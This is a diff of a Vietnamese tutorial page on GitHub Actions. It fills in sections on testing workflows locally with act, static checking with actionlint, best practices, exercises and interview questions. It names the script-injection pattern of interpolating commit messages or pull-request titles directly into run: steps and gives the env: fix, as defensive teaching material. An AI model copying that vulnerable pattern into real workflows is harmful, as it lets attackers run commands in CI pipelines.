-<p>TODO (bắt buộc nếu Importance ★★★★/★★★★★)</p>
+<p><strong>Vì sao <code>act</code> — công cụ được thiết kế để "giả lập GitHub Actions" — lại không cài đặt sẵn mọi
+công cụ mà runner thật của GitHub có?</strong> Runner <code>ubuntu-latest</code> thật của GitHub là một image rất
+nặng (nhiều GB), cài sẵn hàng trăm công cụ phổ biến (Maven, Node, Python, Docker, nhiều SDK khác)
+để phục vụ đa số workflow phổ biến mà không cần cài thêm gì. <code>act</code> cho người dùng lựa chọn giữa
+nhiều kích thước image (Micro/Medium/Large) đánh đổi giữa <strong>tốc độ tải về</strong> và <strong>độ đầy đủ công
+cụ</strong> — image Medium (dùng ở đây) ưu tiên nhẹ, chỉ chứa những gì cần để hầu hết Action phổ biến
+(<code>actions/checkout</code>, <code>actions/setup-*</code>) hoạt động, không cố gắng sao chép <strong>toàn bộ</strong> nội dung
+runner thật. Bài học thực tế: <code>act</code> rất hữu ích để debug <strong>cấu trúc và logic</strong> của workflow (thứ
+tự step, biến môi trường, điều kiện <code>if:</code>) nhanh chóng, nhưng <strong>không thể thay thế hoàn toàn</strong> một
+lần chạy thật trên GitHub trước khi merge vào nhánh chính — đặc biệt với các bước phụ thuộc công cụ
+cụ thể có thể không có sẵn trong image local.</p>
 <h2 id="historical-note">Historical Note<a class="headerlink" href="#historical-note" title="Permanent link">&para;</a></h2>
-<p>TODO (tùy chọn, chỉ viết nếu có insight thật)</p>
+<p>GitHub Actions ra mắt năm 2019, là một trong những entrant muộn hơn so với các nền tảng CI/CD lâu
+đời khác (Jenkins từ 2011, Travis CI từ 2011, CircleCI từ 2011) — nhưng có lợi thế tích hợp trực
+tiếp vào GitHub, không cần cấu hình webhook hay dịch vụ ngoài. <code>act</code> ra đời năm 2019 gần như ngay
+sau đó, phản ánh nhu cầu thực tế rất sớm của cộng đồng: muốn debug workflow YAML mà không phải chờ
+đợi và làm bẩn lịch sử commit chỉ để thử nghiệm cấu hình CI.</p>
 <h2 id="myth-vs-reality">Myth vs Reality<a class="headerlink" href="#myth-vs-reality" title="Permanent link">&para;</a></h2>
 <ul>
-<li>Myth: TODO</li>
-<li>Reality: TODO</li>
+<li><strong>Myth:</strong> "Workflow chạy được (pass) khi test bằng <code>act</code> nghĩa là chắc chắn sẽ chạy đúng y hệt
+  trên GitHub Actions thật."
+  <strong>Reality:</strong> Đã chứng minh bằng thực nghiệm — cùng workflow, bước <code>mvn</code> thất bại trên <code>act</code> do
+  thiếu Maven trong image runner tối giản, dù workflow <strong>hoàn toàn hợp lệ</strong> và sẽ chạy đúng trên
+  runner thật của GitHub (đã cài sẵn Maven).</li>
+<li><strong>Myth:</strong> "Chỉ cần YAML đúng cú pháp là workflow an toàn để chạy."
+  <strong>Reality:</strong> Đã chứng minh bằng thực nghiệm — <code>actionlint</code> phát hiện lỗ hổng script injection
+  trong một workflow có YAML hoàn toàn hợp lệ về mặt cú pháp; an toàn về cú pháp không đồng nghĩa
+  an toàn về bảo mật.</li>
 </ul>
 <h2 id="common-mistakes">Common Mistakes<a class="headerlink" href="#common-mistakes" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
+<ul>
+<li><strong>Nội suy trực tiếp dữ liệu do người dùng kiểm soát</strong> (<code>github.event.*.message</code>,
+  <code>github.event.pull_request.title</code>...) vào <code>run:</code> — lỗ hổng script injection, như đã chứng minh
+  ở Deep Dive.</li>
+<li><strong>Kết luận workflow có lỗi chỉ dựa vào kết quả chạy bằng <code>act</code></strong> mà không đối chiếu xem lỗi đó
+  có phải do khác biệt môi trường giữa <code>act</code> và runner thật hay không.</li>
+<li><strong>Không chạy <code>actionlint</code> trước khi commit workflow mới</strong> — bỏ lỡ cơ hội phát hiện sớm cả lỗi cú
+  pháp lẫn lỗi bảo mật, phải chờ tới khi workflow thật sự chạy trên GitHub mới phát hiện.</li>
+</ul>
 <h2 id="best-practices">Best Practices<a class="headerlink" href="#best-practices" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
-<h2 id="production-notes">Production Notes<a class="headerlink" href="#production-notes" title="Permanent link">&para;</a></h2>
-<p>TODO (nếu phù hợp — theo template: Problem → Symptoms → Root Cause → Debug → Solution → Prevention)</p>
+<ul>
+<li>Luôn chạy <code>actionlint</code> trên mọi file <code>.github/workflows/*.yml</code> trước khi commit — bắt được cả
+  lỗi cú pháp lẫn các pattern bảo mật nguy hiểm đã biết.</li>
+<li>Không bao giờ nội suy trực tiếp dữ liệu do người dùng kiểm soát vào <code>run:</code> — luôn truyền qua
+  <code>env:</code> trước.</li>
+<li>Dùng <code>act</code> để lặp nhanh khi debug <strong>cấu trúc/logic</strong> workflow, nhưng vẫn xác nhận lần cuối bằng
+  một lần chạy thật (ví dụ trên một branch thử nghiệm) trước khi coi là hoàn thiện.</li>
+<li>Pin phiên bản Action cụ thể (<code>actions/checkout@v4</code>, không dùng <code>@main</code>) để tránh thay đổi hành
+  vi đột ngột ngoài kiểm soát khi Action gốc cập nhật.</li>
+</ul>
 <h2 id="debug-checklist">Debug Checklist<a class="headerlink" href="#debug-checklist" title="Permanent link">&para;</a></h2>
 <ul>
-<li>[ ] TODO (nếu phù hợp)</li>
+<li>[ ] Một step thất bại khi chạy bằng <code>act</code> nhưng workflow trông có vẻ đúng? → kiểm tra xem đó có
+      phải do image runner tối giản của <code>act</code> thiếu công cụ (như Maven ở đây) hay không, không
+      phải lỗi thật của workflow.</li>
+<li>[ ] Cần rà soát bảo mật một workflow mới? → chạy <code>actionlint</code>, đặc biệt chú ý cảnh báo
+      "potentially untrusted" liên quan tới các trường <code>github.event.*</code>.</li>
+<li>[ ] Workflow tham chiếu <code>steps.&lt;id&gt;.outputs.*</code> nhưng không hoạt động như mong đợi? → xác nhận
+      step ID đó thực sự tồn tại và đã chạy trước bước tham chiếu (actionlint bắt được lỗi tham
+      chiếu step không tồn tại, như đã thấy ở Example).</li>
 </ul>
-<h2 id="source-code-walkthrough">Source Code Walkthrough<a class="headerlink" href="#source-code-walkthrough" title="Permanent link">&para;</a></h2>
-<p>TODO (bắt buộc nếu Importance ★★★★/★★★★★, nếu phù hợp)</p>
 <h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
+<p>GitHub Actions định nghĩa pipeline CI/CD bằng YAML gồm workflow/job/step; <code>actionlint</code> kiểm tra
+tĩnh cả cú pháp lẫn ngữ nghĩa biểu thức <code>${{ }}</code>, phát hiện được cả lỗi cấu trúc lẫn lỗ hổng bảo
+mật thật (script injection qua dữ liệu người dùng kiểm soát như commit message) — đã chứng minh
+bằng thực nghiệm với một workflow cố ý viết sai. <code>act</code> cho phép chạy thật workflow trên máy cục bộ
+bằng Docker, hữu ích để debug nhanh logic/cấu trúc, nhưng image runner tối giản của nó có thể thiếu
+công cụ mà runner thật của GitHub có sẵn (như Maven) — một khác biệt môi trường cần phân biệt rõ
+với lỗi thật trong workflow. Nội suy trực tiếp dữ liệu người dùng kiểm soát vào <code>run:</code> là lỗ hổng
+script injection nghiêm trọng, khắc phục bằng cách truyền qua biến môi trường (<code>env:</code>) thay vì nội
+suy chuỗi trực tiếp.</p>
 <h2 id="interview-questions">Interview Questions<a class="headerlink" href="#interview-questions" title="Permanent link">&para;</a></h2>
-<blockquote>
-<p>TODO — chưa có câu hỏi nào từ spec/raw-interview-questions.md map vào đây.</p>
-</blockquote>
+<p><strong>Mid</strong></p>
+<ul>
+<li>Sự khác biệt giữa workflow, job, và step trong GitHub Actions?</li>
+<li><code>actionlint</code> kiểm tra những gì mà một YAML linter thông thường không kiểm tra được?</li>
+</ul>
+<p><strong>Senior</strong></p>
+<ul>
+<li>Vì sao nội suy <code>${{ github.event.commits[0].message }}</code> trực tiếp vào <code>run:</code> là một lỗ hổng bảo
+  mật? Cách khắc phục đúng?</li>
+<li>Chạy workflow thành công bằng <code>act</code> cục bộ có đảm bảo nó sẽ chạy đúng trên GitHub Actions thật
+  không? Vì sao?</li>
+</ul>
 <h2 id="exercises">Exercises<a class="headerlink" href="#exercises" title="Permanent link">&para;</a></h2>
 <ul>
-<li>[ ] TODO</li>
+<li>[ ] Sửa lỗi script injection ở Example bằng cách truyền <code>github.event.commits[0].message</code> qua
+      <code>env:</code>, chạy lại <code>actionlint</code> xác nhận cảnh báo biến mất.</li>
+<li>[ ] Thử chạy <code>act</code> với image Large thay vì Medium (<code>-P ubuntu-latest=catthehacker/ubuntu:full-latest</code>),
+      xác nhận bước <code>mvn test</code> có thành công hay không với image đầy đủ hơn.</li>
+<li>[ ] Thêm một job <code>deploy</code> phụ thuộc vào <code>build-and-test</code> (dùng <code>needs:</code>), chỉ chạy khi
+      <code>github.ref == 'refs/heads/main'</code>, validate bằng <code>actionlint</code>.</li>
 </ul>
 <h2 id="cheat-sheet">Cheat Sheet<a class="headerlink" href="#cheat-sheet" title="Permanent link">&para;</a></h2>
-<p>TODO</p>
+<table>
+<thead>
+<tr>
+<th>Công cụ</th>
+<th>Chạy workflow thật?</th>
+<th>Cần kết nối GitHub?</th>
+<th>Bắt lỗi bảo mật?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>actionlint</code></td>
+<td>Không (chỉ phân tích tĩnh)</td>
+<td>Không</td>
+<td>Có</td>
+</tr>
+<tr>
+<td><code>act</code></td>
+<td>Có (giả lập bằng Docker cục bộ)</td>
+<td>Hạn chế</td>
+<td>Không (không phải mục đích chính)</td>
+</tr>
+<tr>
+<td>Chạy thật trên GitHub</td>
+<td>Có</td>
+<td>Có</td>
+<td>Không (cần công cụ riêng như <code>actionlint</code>/CodeQL)</td>
+</tr>
+</tbody>
+</table>
 <h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
 <ul>
-<li>TODO (ưu tiên JLS / JVM Spec / OpenJDK / Spring Docs / Hibernate Docs — xem spec/part-2-chapter-standard.md §23)</li>
+<li>GitHub Actions Documentation — Workflow syntax, Security hardening.</li>
+<li><code>actionlint</code> — https://github.com/rhysd/actionlint.</li>
+<li><code>act</code> — https://github.com/nektos/act.</li>
 </ul>
 
 
